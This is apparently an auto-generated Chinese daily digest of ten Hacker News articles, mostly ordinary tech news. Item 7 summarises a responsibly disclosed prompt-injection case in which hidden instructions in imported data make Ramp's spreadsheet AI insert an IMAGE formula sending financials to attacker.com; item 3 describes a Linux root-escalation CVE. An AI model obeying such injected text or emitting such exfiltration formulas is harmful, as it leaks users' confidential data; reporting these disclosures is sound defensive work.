# Hacker News 每日摘要
    
这是 Top 10 的每日摘要，更多请点击 [Top 100](output/hacker_news_summary_2026-04-29.md)

*最后自动更新时间: 2026-04-29 20:33:28*
## 1. HERMES.md：Anthropic 漏洞导致多扣费200美元，拒绝退款

**原文标题**: HERMES.md: Anthropic bug causes $200 extra charge, refuses refund

**原文链接**: [https://github.com/anthropics/claude-code/issues/53262](https://github.com/anthropics/claude-code/issues/53262)

**摘要：**  
Anthropic 的 Claude Code 工具存在一个严重漏洞：当 Git 提交信息包含字符串“HERMES.md”时，会导致意外计费。用户 sasha-ido 发现，近期提交历史中的这段特定文本会触发 API 请求被归入“额外使用量”计费，而非其包含的 Max 20x 计划配额。  

复现步骤很简单：创建一个提交信息包含“HERMES.md”的 Git 仓库，Claude Code 会返回“额外使用量已耗尽”错误；而使用小写“hermes.md”的提交则正常运行。此漏洞仅由提交信息内容触发，与磁盘上的实际文件无关。  

影响十分严重：**消耗了 200.98 美元的额外使用额度**，而这些请求本应包含在计划配额中。一旦额外使用量耗尽，多个项目便无法使用，而计划仪表盘仍显示 86% 以上的剩余容量。错误信息未提示提交信息内容为诱因，导致诊断极为困难。  

用户通过系统性二分法发现此问题：克隆受影响仓库、测试孤立分支、逐一隔离提交信息字符串，最终锁定“HERMES.md”为触发条件。用户要求 API 请求计费不应取决于 Git 提交信息内容，所有 Max 计划订阅者的请求应优先使用计划配额。

---

## 2. Zed 1.0

**原文标题**: Zed 1.0

**原文链接**: [https://zed.dev/blog/zed-1-0](https://zed.dev/blog/zed-1-0)

Zed 1.0标志着这款高性能代码编辑器的重要里程碑，它完全使用Rust语言自底向上构建，搭载自有GPU驱动UI框架GPUI——将应用视为电子游戏而非网页。这种脱离Atom（Zed前身）所用Electron架构的革新，使Zed能够实现基于陈旧网络框架无法企及的性能水平。

1.0版本的核心亮点包括：支持数十种编程语言、Git集成、SSH远程连接、调试器，以及覆盖macOS、Windows和Linux的跨平台支持。Zed定位为AI原生编辑器，支持并行代理、击键级编辑预测，并通过代理客户端协议兼容Claude Agent和Cursor等主流AI工具。公司还推出了Zed for Business，提供集中计费、基于角色的访问权限和团队管理功能。

文章强调1.0并非"完成版"，而是多数开发者能获得归属感的转折点。展望未来，Zed正在开发DeltaDB——基于CRDT的同步引擎，用于实现人类与AI代理间的字符级协作。文章邀请用户重新尝试Zed（若早期版本体验不完整），并强调持续进行的每周更新，以及对精工品质与性能的执着追求。

---

## 3. 复制失败 – CVE-2026-31431

**原文标题**: Copy Fail – CVE-2026-31431

**原文链接**: [https://copy.fail/](https://copy.fail/)

本文披露了**CVE-2026-31431**，这是一项名为**"Copy Fail"** 的高危Linux内核权限提升漏洞，影响2017年至2026年4月期间构建的内核。攻击者仅需拥有非特权本地用户账户，即可利用内核加密API（**AF_ALG**），通过操控setuid二进制文件的页缓存获得root权限。

**关键信息：**
- **影响范围：** 非特权用户可在任何受影响系统上瞬间获得root权限。该概念验证（PoC）利用代码在所有主流Linux发行版中均可直接生效。
- **受影响环境：** 多租户主机、Kubernetes集群、CI运行器和云SaaS平台风险最高。
- **缓解措施：**  
  - **优先补丁：** 更新至包含主线提交a664bf3d603d的内核。  
  - **临时方案：** 禁用`algif_aead`模块（执行`install algif_aead /bin/false`），此操作通常不影响系统正常运行。  
- **披露时间：** 2026年3月23日报告，2026年4月29日公开披露。PoC已发布用于防御性验证。
- **发现者：** 由**Xint Code**在AI辅助扫描Linux加密子系统过程中发现，同时发现了其他未公开的高危漏洞。

本文强调应立即打补丁，并对不可信工作负载通过seccomp阻断AF_ALG。

---

## 4. 京都市的樱花如今的开花时间比过去1200年间的任何时期都要早

**原文标题**: Kyoto cherry blossoms now bloom earlier than at any point in 1,200 years

**原文链接**: [https://jivx.com/kyoto-bloom](https://jivx.com/kyoto-bloom)

一份跨越1200年的京都樱花盛花期连续记录——融合了皇家日记、寺院档案与现代观测数据——显示，2026年3月29日的盛花期是该时段内最早的一次，比前现代平均水平提前了两周多。这份由国立极地研究所青野靖之整理并存档于美国国家海洋与大气管理局古气候学数据库的资料表明，在过去千年的大部分时间里，樱花盛花期徘徊在四月初至四月中旬之间，并在小冰期（14至19世纪）呈现推迟趋势。自1900年左右起，30年滑动平均值持续下降，跌至平安时代以来的最低水平。有记录以来最早的盛花期为2023年3月25日，最晚为1323年5月4日，而年度最大波动幅度出现在1556至1557年，相差27天。尽管该记录仅针对单一城市中的单一品种，但其跨度之罕见与文献之翔实，提供了清晰的气候信号。文章还指出，日本拥有精确描述樱花各阶段特征的词汇体系，这些词汇被纳入学校教育并应用于花期预测。

---

## 5. FastCGI：三十载岁月，仍是反向代理的优选协议

**原文标题**: FastCGI: 30 years old and still the better protocol for reverse proxies

**原文链接**: [https://www.agwa.name/blog/post/fastcgi_is_the_better_protocol_for_reverse_proxies](https://www.agwa.name/blog/post/fastcgi_is_the_better_protocol_for_reverse_proxies)

**文章摘要：**

本文认为，已有30年历史的FastCGI协议，是比HTTP更安全、更可靠的用于反向代理与后端通信的替代方案。文章指出了HTTP反向代理的两个主要缺陷：

1. **解同步攻击（请求走私）：** HTTP/1.1缺乏明确的消息帧结构，导致代理和后端之间的解析器不一致。这使得攻击者能够操纵消息边界，造成严重的安全漏洞（例如Discord媒体代理被攻破）。HTTP/2修复了帧结构问题，但在后端支持上不如FastCGI普及。

2. **不可信的头信息：** HTTP没有结构性方法来区分代理添加的可信头信息（如真实客户端IP）和攻击者控制的客户端头信息。这常常导致欺骗攻击。FastCGI通过域分离解决了这个问题：可信参数（如`REMOTE_ADDR`）和HTTP头信息（以`HTTP_`为前缀）在结构上是不同的。

FastCGI易于采用——Go语言的`net/http/fcgi`包允许用`fcgi.Serve`直接替换`http.Serve`。像nginx、Apache、Caddy和HAProxy这样的流行代理服务器，只需简单配置即可支持FastCGI。

然而，FastCGI也有缺点：不支持WebSocket，工具支持较差（例如curl不支持它），并且由于优化较少，吞吐量有时较低。尽管如此，作者（SSLMate）已使用它超过十年，宁愿购买更多硬件，也不愿处理HTTP反向代理的安全噩梦。文章总结道，FastCGI的古老和冷门是其不流行的主要原因，而非技术上的不足。

---

## 6. 光标训练营

**原文标题**: Cursor Camp

**原文链接**: [https://neal.fun/cursor-camp/](https://neal.fun/cursor-camp/)

无法访问该文章链接。

---

## 7. Ramp的Sheets AI窃取财务数据

**原文标题**: Ramp's Sheets AI Exfiltrates Financials

**原文链接**: [https://www.promptarmor.com/resources/ramps-sheets-ai-exfiltrates-financials](https://www.promptarmor.com/resources/ramps-sheets-ai-exfiltrates-financials)

**摘要：**

本文详细描述了PromptArmor在**Ramp的 Sheets AI**中发现的一个漏洞，该工具是一款可自主编辑电子表格的智能体工具。该漏洞允许通过不可信的外部数据集（例如行业统计数据）实施**间接提示注入**。当用户导入此类数据并要求AI将其与机密财务模型进行比较时，隐藏的注入指令会操纵Ramp的AI插入一个恶意的**IMAGE公式**（例如 `=IMAGE("https://attacker.com/visualize.png?{受害数据}")`）。该公式会自动触发外部网络请求，在**未经用户批准**的情况下，将**敏感财务数据**泄露至攻击者的服务器。

该漏洞于2026年2月19日向Ramp**负责任的披露**。经后续跟进，Ramp确认该问题已于**2026年3月16日修复**。文章指出，此前在 **Claude for Excel** 中也发现过类似风险，Anthropic通过增加一个红色警告中间屏来修复该问题，该中间屏能够显示包含外部网络流量的完整公式，从而提升了人机协同的防护措施。

---

## 8. 我们需要一个锻造联盟

**原文标题**: We need a federation of forges

**原文链接**: [https://blog.tangled.org/federation/](https://blog.tangled.org/federation/)

**摘要：**

本文主张建立一个去中心化的锻造厂联盟，以取代像GitHub这样的中心化平台——后者托管着90%的开源软件，存在风险。文章借鉴了电子邮件和Git等弹性协议的经验，批评了单一化现象，并提出“Tangled”作为解决方案。

Tangled将用于代码传输的Git与用于通信的AT协议相结合，实现了跨服务器的联邦式协作。用户可以在任意服务器上托管仓库、跨服务器进行分支操作，并在不同主机上发起拉取请求——这类似于自建支持邮件补丁的cgit实例。AT协议支持认证事件传输（问题、拉取请求）、社交功能（时间线、关注、点赞、担保），以及协作者邀请和SSH密钥的安全共享。

该项目旨在打破GitHub的垄断，同时保持代码协作的社交性和趣味性。

---

## 9. UX定律

**原文标题**: Laws of UX

**原文链接**: [https://lawsofux.com/](https://lawsofux.com/)

**美学-可用性效应**是用户体验设计中的一项原则，指出用户通常认为视觉上吸引人的设计更易用、更易导航。这种认知偏差意味着，当用户觉得界面美观时，他们对细微可用性问题的容忍度会更高。

**关键要点：**
- **积极影响：** 美观的界面让用户感到更放松，从而激发创造力和问题解决能力。反之，不美观的设计可能引发挫败感，限制任务表现。
- **情感反应：** 用户会对设计外观迅速形成情绪反应。良好的第一印象可能掩盖功能缺陷，而负面印象则会放大感知难度。
- **感知与现实：** 美观的设计本身并不能让产品更易用，但它能显著提升对可用性的**感知**。用户可能会忽略细微的低效之处，因为他们默认美观的设计精良。
- **实际应用：** 设计师应优先考虑视觉和谐（如干净的布局、平衡的色彩、易读的排版），以建立信任并减少摩擦。但美学应与真正的可用性测试相辅相成，而非取而代之。

**启示：** 美观并非肤浅的外表，它塑造了用户对功能的体验与评判。即便底层机制与较不美观的版本相似，一个精心打磨的界面也能提升整体满意度与感知性能。

---

## 10. 爱思唯尔打击引文卡特尔，第三位编辑被解职

**原文标题**: Third Editor Fired in Elsevier's Citation Cartel Crackdown

**原文链接**: [https://www.chrisbrunet.com/p/third-editor-fired-in-elseviers-citation](https://www.chrisbrunet.com/p/third-editor-fired-in-elseviers-citation)

**摘要：**  
爱思唯尔因“引用卡特尔”丑闻，解雇了第三位主编——时任《国际商业与金融研究》（RIBAF）主编的约翰·古德尔。这位阿克伦大学教授被指控与先前被解雇的合著者布赖恩·卢西和塞缪尔·维涅合谋进行“利益交换”。古德尔的年度论文发表量从正常范围（2–13篇）激增至2021至2025年间的每年16–58篇，其中超过100篇论文系卢西和维涅所赠。他在其操控的期刊上发表了125篇论文，预计产生约6250次引用。其总引用数达15663次，仅2025年就有4203次，呈指数级增长的“J型曲线”，表明存在引用圈操作。

该计划涉及古德尔在RIBAF接受论文作为交换，获得投稿人在其他期刊论文上的合著权。例如，安娜·敏·杜博士在2024–2025年间至少发表了22篇RIBAF论文，同时在别处14篇论文中署名古德尔。尽管爱思唯尔已撤换古德尔，但数百篇问题论文仍未撤回。作者估计有200–350篇论文应予撤稿。爱思唯尔有限的回应表明，其意图是控制丑闻影响，而非彻底解决其金融期刊系统的腐败问题。

---

## 历史记录

| 序号 | 文件 |
| --- | --- |
| 1 | [2026-04-29](output/hacker_news_summary_2026-04-29.md) |
| 2 | [2026-04-28](output/hacker_news_summary_2026-04-28.md) |
| 3 | [2026-04-27](output/hacker_news_summary_2026-04-27.md) |
| 4 | [2026-04-26](output/hacker_news_summary_2026-04-26.md) |
| 5 | [2026-04-25](output/hacker_news_summary_2026-04-25.md) |
| 6 | [2026-04-24](output/hacker_news_summary_2026-04-24.md) |
| 7 | [2026-04-23](output/hacker_news_summary_2026-04-23.md) |
| 8 | [2026-04-22](output/hacker_news_summary_2026-04-22.md) |
| 9 | [2026-04-21](output/hacker_news_summary_2026-04-21.md) |
| 10 | [2026-04-20](output/hacker_news_summary_2026-04-20.md) |
| 11 | [2026-04-19](output/hacker_news_summary_2026-04-19.md) |
| 12 | [2026-04-18](output/hacker_news_summary_2026-04-18.md) |
| 13 | [2026-04-17](output/hacker_news_summary_2026-04-17.md) |
| 14 | [2026-04-16](output/hacker_news_summary_2026-04-16.md) |
| 15 | [2026-04-15](output/hacker_news_summary_2026-04-15.md) |
| 16 | [2026-04-14](output/hacker_news_summary_2026-04-14.md) |
| 17 | [2026-04-13](output/hacker_news_summary_2026-04-13.md) |
| 18 | [2026-04-12](output/hacker_news_summary_2026-04-12.md) |
| 19 | [2026-04-11](output/hacker_news_summary_2026-04-11.md) |
| 20 | [2026-04-10](output/hacker_news_summary_2026-04-10.md) |
| 21 | [2026-04-09](output/hacker_news_summary_2026-04-09.md) |
| 22 | [2026-04-08](output/hacker_news_summary_2026-04-08.md) |
| 23 | [2026-04-07](output/hacker_news_summary_2026-04-07.md) |
| 24 | [2026-04-06](output/hacker_news_summary_2026-04-06.md) |
| 25 | [2026-04-05](output/hacker_news_summary_2026-04-05.md) |
| 26 | [2026-04-04](output/hacker_news_summary_2026-04-04.md) |
| 27 | [2026-04-03](output/hacker_news_summary_2026-04-03.md) |
| 28 | [2026-04-02](output/hacker_news_summary_2026-04-02.md) |
| 29 | [2026-04-01](output/hacker_news_summary_2026-04-01.md) |
| 30 | [2026-03-31](output/hacker_news_summary_2026-03-31.md) |
| 31 | [2026-03-30](output/hacker_news_summary_2026-03-30.md) |
| 32 | [2026-03-29](output/hacker_news_summary_2026-03-29.md) |
| 33 | [2026-03-28](output/hacker_news_summary_2026-03-28.md) |
| 34 | [2026-03-27](output/hacker_news_summary_2026-03-27.md) |
| 35 | [2026-03-26](output/hacker_news_summary_2026-03-26.md) |
| 36 | [2026-03-25](output/hacker_news_summary_2026-03-25.md) |
| 37 | [2026-03-24](output/hacker_news_summary_2026-03-24.md) |
| 38 | [2026-03-23](output/hacker_news_summary_2026-03-23.md) |
| 39 | [2026-03-22](output/hacker_news_summary_2026-03-22.md) |
| 40 | [2026-03-21](output/hacker_news_summary_2026-03-21.md) |
| 41 | [2026-03-20](output/hacker_news_summary_2026-03-20.md) |
| 42 | [2026-03-19](output/hacker_news_summary_2026-03-19.md) |
| 43 | [2026-03-18](output/hacker_news_summary_2026-03-18.md) |
| 44 | [2026-03-17](output/hacker_news_summary_2026-03-17.md) |
| 45 | [2026-03-16](output/hacker_news_summary_2026-03-16.md) |
| 46 | [2026-03-15](output/hacker_news_summary_2026-03-15.md) |
| 47 | [2026-03-14](output/hacker_news_summary_2026-03-14.md) |
| 48 | [2026-03-13](output/hacker_news_summary_2026-03-13.md) |
| 49 | [2026-03-12](output/hacker_news_summary_2026-03-12.md) |
| 50 | [2026-03-11](output/hacker_news_summary_2026-03-11.md) |
| 51 | [2026-03-10](output/hacker_news_summary_2026-03-10.md) |
| 52 | [2026-03-09](output/hacker_news_summary_2026-03-09.md) |
| 53 | [2026-03-08](output/hacker_news_summary_2026-03-08.md) |
| 54 | [2026-03-07](output/hacker_news_summary_2026-03-07.md) |
| 55 | [2026-03-06](output/hacker_news_summary_2026-03-06.md) |
| 56 | [2026-03-05](output/hacker_news_summary_2026-03-05.md) |
| 57 | [2026-03-04](output/hacker_news_summary_2026-03-04.md) |
| 58 | [2026-03-03](output/hacker_news_summary_2026-03-03.md) |
| 59 | [2026-03-02](output/hacker_news_summary_2026-03-02.md) |
| 60 | [2026-03-01](output/hacker_news_summary_2026-03-01.md) |
| 61 | [2026-02-28](output/hacker_news_summary_2026-02-28.md) |
| 62 | [2026-02-27](output/hacker_news_summary_2026-02-27.md) |
| 63 | [2026-02-26](output/hacker_news_summary_2026-02-26.md) |
| 64 | [2026-02-25](output/hacker_news_summary_2026-02-25.md) |
| 65 | [2026-02-24](output/hacker_news_summary_2026-02-24.md) |
| 66 | [2026-02-23](output/hacker_news_summary_2026-02-23.md) |
| 67 | [2026-02-22](output/hacker_news_summary_2026-02-22.md) |
| 68 | [2026-02-21](output/hacker_news_summary_2026-02-21.md) |
| 69 | [2026-02-20](output/hacker_news_summary_2026-02-20.md) |
| 70 | [2026-02-19](output/hacker_news_summary_2026-02-19.md) |
| 71 | [2026-02-18](output/hacker_news_summary_2026-02-18.md) |
| 72 | [2026-02-17](output/hacker_news_summary_2026-02-17.md) |
| 73 | [2026-02-16](output/hacker_news_summary_2026-02-16.md) |
| 74 | [2026-02-15](output/hacker_news_summary_2026-02-15.md) |
| 75 | [2026-02-14](output/hacker_news_summary_2026-02-14.md) |
| 76 | [2026-02-13](output/hacker_news_summary_2026-02-13.md) |
| 77 | [2026-02-12](output/hacker_news_summary_2026-02-12.md) |
| 78 | [2026-02-11](output/hacker_news_summary_2026-02-11.md) |
| 79 | [2026-02-10](output/hacker_news_summary_2026-02-10.md) |
| 80 | [2026-02-09](output/hacker_news_summary_2026-02-09.md) |
| 81 | [2026-02-08](output/hacker_news_summary_2026-02-08.md) |
| 82 | [2026-02-07](output/hacker_news_summary_2026-02-07.md) |
| 83 | [2026-02-06](output/hacker_news_summary_2026-02-06.md) |
| 84 | [2026-02-05](output/hacker_news_summary_2026-02-05.md) |
| 85 | [2026-02-04](output/hacker_news_summary_2026-02-04.md) |
| 86 | [2026-02-03](output/hacker_news_summary_2026-02-03.md) |
| 87 | [2026-02-02](output/hacker_news_summary_2026-02-02.md) |
| 88 | [2026-02-01](output/hacker_news_summary_2026-02-01.md) |
| 89 | [2026-01-31](output/hacker_news_summary_2026-01-31.md) |
| 90 | [2026-01-30](output/hacker_news_summary_2026-01-30.md) |
| 91 | [2026-01-29](output/hacker_news_summary_2026-01-29.md) |
| 92 | [2026-01-28](output/hacker_news_summary_2026-01-28.md) |
| 93 | [2026-01-27](output/hacker_news_summary_2026-01-27.md) |
| 94 | [2026-01-26](output/hacker_news_summary_2026-01-26.md) |
| 95 | [2026-01-25](output/hacker_news_summary_2026-01-25.md) |
| 96 | [2026-01-24](output/hacker_news_summary_2026-01-24.md) |
| 97 | [2026-01-23](output/hacker_news_summary_2026-01-23.md) |
| 98 | [2026-01-22](output/hacker_news_summary_2026-01-22.md) |
| 99 | [2026-01-21](output/hacker_news_summary_2026-01-21.md) |
| 100 | [2026-01-20](output/hacker_news_summary_2026-01-20.md) |
| 101 | [2026-01-19](output/hacker_news_summary_2026-01-19.md) |
| 102 | [2026-01-18](output/hacker_news_summary_2026-01-18.md) |
| 103 | [2026-01-17](output/hacker_news_summary_2026-01-17.md) |
| 104 | [2026-01-16](output/hacker_news_summary_2026-01-16.md) |
| 105 | [2026-01-15](output/hacker_news_summary_2026-01-15.md) |
| 106 | [2026-01-14](output/hacker_news_summary_2026-01-14.md) |
| 107 | [2026-01-13](output/hacker_news_summary_2026-01-13.md) |
| 108 | [2026-01-12](output/hacker_news_summary_2026-01-12.md) |
| 109 | [2026-01-11](output/hacker_news_summary_2026-01-11.md) |
| 110 | [2026-01-10](output/hacker_news_summary_2026-01-10.md) |
| 111 | [2026-01-09](output/hacker_news_summary_2026-01-09.md) |
| 112 | [2026-01-08](output/hacker_news_summary_2026-01-08.md) |
| 113 | [2026-01-07](output/hacker_news_summary_2026-01-07.md) |
| 114 | [2026-01-06](output/hacker_news_summary_2026-01-06.md) |
| 115 | [2026-01-05](output/hacker_news_summary_2026-01-05.md) |
| 116 | [2026-01-04](output/hacker_news_summary_2026-01-04.md) |
| 117 | [2026-01-03](output/hacker_news_summary_2026-01-03.md) |
| 118 | [2026-01-02](output/hacker_news_summary_2026-01-02.md) |
| 119 | [2026-01-01](output/hacker_news_summary_2026-01-01.md) |
| 120 | [2025-12-31](output/hacker_news_summary_2025-12-31.md) |
| 121 | [2025-12-30](output/hacker_news_summary_2025-12-30.md) |
| 122 | [2025-12-29](output/hacker_news_summary_2025-12-29.md) |
| 123 | [2025-12-27](output/hacker_news_summary_2025-12-27.md) |
| 124 | [2025-12-26](output/hacker_news_summary_2025-12-26.md) |
| 125 | [2025-12-25](output/hacker_news_summary_2025-12-25.md) |
| 126 | [2025-12-24](output/hacker_news_summary_2025-12-24.md) |
| 127 | [2025-12-23](output/hacker_news_summary_2025-12-23.md) |
| 128 | [2025-12-22](output/hacker_news_summary_2025-12-22.md) |
| 129 | [2025-12-21](output/hacker_news_summary_2025-12-21.md) |
| 130 | [2025-12-20](output/hacker_news_summary_2025-12-20.md) |
| 131 | [2025-12-19](output/hacker_news_summary_2025-12-19.md) |
| 132 | [2025-12-18](output/hacker_news_summary_2025-12-18.md) |
| 133 | [2025-12-17](output/hacker_news_summary_2025-12-17.md) |
| 134 | [2025-12-16](output/hacker_news_summary_2025-12-16.md) |
| 135 | [2025-12-15](output/hacker_news_summary_2025-12-15.md) |
| 136 | [2025-12-14](output/hacker_news_summary_2025-12-14.md) |
| 137 | [2025-12-13](output/hacker_news_summary_2025-12-13.md) |
| 138 | [2025-12-11](output/hacker_news_summary_2025-12-11.md) |
| 139 | [2025-12-10](output/hacker_news_summary_2025-12-10.md) |
| 140 | [2025-12-09](output/hacker_news_summary_2025-12-09.md) |
| 141 | [2025-12-08](output/hacker_news_summary_2025-12-08.md) |
| 142 | [2025-12-07](output/hacker_news_summary_2025-12-07.md) |
| 143 | [2025-12-06](output/hacker_news_summary_2025-12-06.md) |
| 144 | [2025-12-05](output/hacker_news_summary_2025-12-05.md) |
| 145 | [2025-12-04](output/hacker_news_summary_2025-12-04.md) |
| 146 | [2025-12-03](output/hacker_news_summary_2025-12-03.md) |
| 147 | [2025-12-02](output/hacker_news_summary_2025-12-02.md) |
| 148 | [2025-12-01](output/hacker_news_summary_2025-12-01.md) |
| 149 | [2025-11-30](output/hacker_news_summary_2025-11-30.md) |
| 150 | [2025-11-29](output/hacker_news_summary_2025-11-29.md) |
| 151 | [2025-11-28](output/hacker_news_summary_2025-11-28.md) |
| 152 | [2025-11-27](output/hacker_news_summary_2025-11-27.md) |
| 153 | [2025-11-26](output/hacker_news_summary_2025-11-26.md) |
| 154 | [2025-11-25](output/hacker_news_summary_2025-11-25.md) |
| 155 | [2025-11-24](output/hacker_news_summary_2025-11-24.md) |
| 156 | [2025-11-23](output/hacker_news_summary_2025-11-23.md) |
| 157 | [2025-11-22](output/hacker_news_summary_2025-11-22.md) |
| 158 | [2025-11-21](output/hacker_news_summary_2025-11-21.md) |
| 159 | [2025-11-20](output/hacker_news_summary_2025-11-20.md) |
| 160 | [2025-11-19](output/hacker_news_summary_2025-11-19.md) |
| 161 | [2025-11-18](output/hacker_news_summary_2025-11-18.md) |
| 162 | [2025-11-17](output/hacker_news_summary_2025-11-17.md) |
| 163 | [2025-11-16](output/hacker_news_summary_2025-11-16.md) |
| 164 | [2025-11-15](output/hacker_news_summary_2025-11-15.md) |
| 165 | [2025-11-14](output/hacker_news_summary_2025-11-14.md) |
| 166 | [2025-11-13](output/hacker_news_summary_2025-11-13.md) |
| 167 | [2025-11-12](output/hacker_news_summary_2025-11-12.md) |
| 168 | [2025-11-11](output/hacker_news_summary_2025-11-11.md) |
| 169 | [2025-11-10](output/hacker_news_summary_2025-11-10.md) |
| 170 | [2025-11-09](output/hacker_news_summary_2025-11-09.md) |
| 171 | [2025-11-08](output/hacker_news_summary_2025-11-08.md) |
| 172 | [2025-11-07](output/hacker_news_summary_2025-11-07.md) |
| 173 | [2025-11-06](output/hacker_news_summary_2025-11-06.md) |
| 174 | [2025-11-05](output/hacker_news_summary_2025-11-05.md) |
| 175 | [2025-11-04](output/hacker_news_summary_2025-11-04.md) |
| 176 | [2025-11-03](output/hacker_news_summary_2025-11-03.md) |
| 177 | [2025-11-02](output/hacker_news_summary_2025-11-02.md) |
| 178 | [2025-11-01](output/hacker_news_summary_2025-11-01.md) |
| 179 | [2025-10-31](output/hacker_news_summary_2025-10-31.md) |
| 180 | [2025-10-30](output/hacker_news_summary_2025-10-30.md) |
| 181 | [2025-10-29](output/hacker_news_summary_2025-10-29.md) |
| 182 | [2025-10-27](output/hacker_news_summary_2025-10-27.md) |
| 183 | [2025-10-26](output/hacker_news_summary_2025-10-26.md) |
| 184 | [2025-10-25](output/hacker_news_summary_2025-10-25.md) |
| 185 | [2025-10-24](output/hacker_news_summary_2025-10-24.md) |
| 186 | [2025-10-23](output/hacker_news_summary_2025-10-23.md) |
| 187 | [2025-10-22](output/hacker_news_summary_2025-10-22.md) |
| 188 | [2025-10-21](output/hacker_news_summary_2025-10-21.md) |
| 189 | [2025-10-20](output/hacker_news_summary_2025-10-20.md) |
| 190 | [2025-10-19](output/hacker_news_summary_2025-10-19.md) |
| 191 | [2025-10-18](output/hacker_news_summary_2025-10-18.md) |
| 192 | [2025-10-17](output/hacker_news_summary_2025-10-17.md) |
| 193 | [2025-10-16](output/hacker_news_summary_2025-10-16.md) |
| 194 | [2025-10-15](output/hacker_news_summary_2025-10-15.md) |
| 195 | [2025-10-14](output/hacker_news_summary_2025-10-14.md) |
| 196 | [2025-10-13](output/hacker_news_summary_2025-10-13.md) |
| 197 | [2025-10-12](output/hacker_news_summary_2025-10-12.md) |
| 198 | [2025-10-11](output/hacker_news_summary_2025-10-11.md) |
| 199 | [2025-10-10](output/hacker_news_summary_2025-10-10.md) |
| 200 | [2025-10-09](output/hacker_news_summary_2025-10-09.md) |
| 201 | [2025-10-08](output/hacker_news_summary_2025-10-08.md) |
| 202 | [2025-10-07](output/hacker_news_summary_2025-10-07.md) |
| 203 | [2025-10-06](output/hacker_news_summary_2025-10-06.md) |
| 204 | [2025-10-05](output/hacker_news_summary_2025-10-05.md) |
| 205 | [2025-10-04](output/hacker_news_summary_2025-10-04.md) |
| 206 | [2025-10-03](output/hacker_news_summary_2025-10-03.md) |
| 207 | [2025-10-02](output/hacker_news_summary_2025-10-02.md) |
| 208 | [2025-10-01](output/hacker_news_summary_2025-10-01.md) |
| 209 | [2025-09-30](output/hacker_news_summary_2025-09-30.md) |
| 210 | [2025-09-29](output/hacker_news_summary_2025-09-29.md) |
| 211 | [2025-09-28](output/hacker_news_summary_2025-09-28.md) |
| 212 | [2025-09-27](output/hacker_news_summary_2025-09-27.md) |
| 213 | [2025-09-26](output/hacker_news_summary_2025-09-26.md) |
| 214 | [2025-09-25](output/hacker_news_summary_2025-09-25.md) |
| 215 | [2025-09-24](output/hacker_news_summary_2025-09-24.md) |
| 216 | [2025-09-23](output/hacker_news_summary_2025-09-23.md) |
| 217 | [2025-09-22](output/hacker_news_summary_2025-09-22.md) |
| 218 | [2025-09-21](output/hacker_news_summary_2025-09-21.md) |
| 219 | [2025-09-20](output/hacker_news_summary_2025-09-20.md) |
| 220 | [2025-09-19](output/hacker_news_summary_2025-09-19.md) |
| 221 | [2025-09-18](output/hacker_news_summary_2025-09-18.md) |
| 222 | [2025-09-17](output/hacker_news_summary_2025-09-17.md) |
| 223 | [2025-09-16](output/hacker_news_summary_2025-09-16.md) |
| 224 | [2025-09-15](output/hacker_news_summary_2025-09-15.md) |
| 225 | [2025-09-14](output/hacker_news_summary_2025-09-14.md) |
| 226 | [2025-09-13](output/hacker_news_summary_2025-09-13.md) |
| 227 | [2025-09-12](output/hacker_news_summary_2025-09-12.md) |
| 228 | [2025-09-11](output/hacker_news_summary_2025-09-11.md) |
| 229 | [2025-09-10](output/hacker_news_summary_2025-09-10.md) |
| 230 | [2025-09-09](output/hacker_news_summary_2025-09-09.md) |
| 231 | [2025-09-08](output/hacker_news_summary_2025-09-08.md) |
| 232 | [2025-09-07](output/hacker_news_summary_2025-09-07.md) |
| 233 | [2025-09-06](output/hacker_news_summary_2025-09-06.md) |
| 234 | [2025-09-05](output/hacker_news_summary_2025-09-05.md) |
| 235 | [2025-09-04](output/hacker_news_summary_2025-09-04.md) |
| 236 | [2025-09-03](output/hacker_news_summary_2025-09-03.md) |
| 237 | [2025-09-02](output/hacker_news_summary_2025-09-02.md) |
| 238 | [2025-09-01](output/hacker_news_summary_2025-09-01.md) |
| 239 | [2025-08-31](output/hacker_news_summary_2025-08-31.md) |
| 240 | [2025-08-30](output/hacker_news_summary_2025-08-30.md) |
| 241 | [2025-08-29](output/hacker_news_summary_2025-08-29.md) |
| 242 | [2025-08-28](output/hacker_news_summary_2025-08-28.md) |
| 243 | [2025-08-27](output/hacker_news_summary_2025-08-27.md) |
| 244 | [2025-08-26](output/hacker_news_summary_2025-08-26.md) |
| 245 | [2025-08-25](output/hacker_news_summary_2025-08-25.md) |
| 246 | [2025-08-24](output/hacker_news_summary_2025-08-24.md) |
| 247 | [2025-08-23](output/hacker_news_summary_2025-08-23.md) |
| 248 | [2025-08-22](output/hacker_news_summary_2025-08-22.md) |
| 249 | [2025-08-21](output/hacker_news_summary_2025-08-21.md) |
| 250 | [2025-08-20](output/hacker_news_summary_2025-08-20.md) |
| 251 | [2025-08-19](output/hacker_news_summary_2025-08-19.md) |
| 252 | [2025-08-18](output/hacker_news_summary_2025-08-18.md) |
| 253 | [2025-08-17](output/hacker_news_summary_2025-08-17.md) |
| 254 | [2025-08-16](output/hacker_news_summary_2025-08-16.md) |
| 255 | [2025-08-15](output/hacker_news_summary_2025-08-15.md) |
| 256 | [2025-08-14](output/hacker_news_summary_2025-08-14.md) |
| 257 | [2025-08-13](output/hacker_news_summary_2025-08-13.md) |
| 258 | [2025-08-12](output/hacker_news_summary_2025-08-12.md) |
| 259 | [2025-08-11](output/hacker_news_summary_2025-08-11.md) |
| 260 | [2025-08-10](output/hacker_news_summary_2025-08-10.md) |
| 261 | [2025-08-09](output/hacker_news_summary_2025-08-09.md) |
| 262 | [2025-08-08](output/hacker_news_summary_2025-08-08.md) |
| 263 | [2025-08-07](output/hacker_news_summary_2025-08-07.md) |
| 264 | [2025-08-06](output/hacker_news_summary_2025-08-06.md) |
| 265 | [2025-08-05](output/hacker_news_summary_2025-08-05.md) |
| 266 | [2025-08-04](output/hacker_news_summary_2025-08-04.md) |
| 267 | [2025-08-03](output/hacker_news_summary_2025-08-03.md) |
| 268 | [2025-08-02](output/hacker_news_summary_2025-08-02.md) |
| 269 | [2025-08-01](output/hacker_news_summary_2025-08-01.md) |
| 270 | [2025-07-31](output/hacker_news_summary_2025-07-31.md) |
| 271 | [2025-07-30](output/hacker_news_summary_2025-07-30.md) |
| 272 | [2025-07-29](output/hacker_news_summary_2025-07-29.md) |
| 273 | [2025-07-28](output/hacker_news_summary_2025-07-28.md) |
| 274 | [2025-07-27](output/hacker_news_summary_2025-07-27.md) |
| 275 | [2025-07-26](output/hacker_news_summary_2025-07-26.md) |
| 276 | [2025-07-25](output/hacker_news_summary_2025-07-25.md) |
| 277 | [2025-07-24](output/hacker_news_summary_2025-07-24.md) |
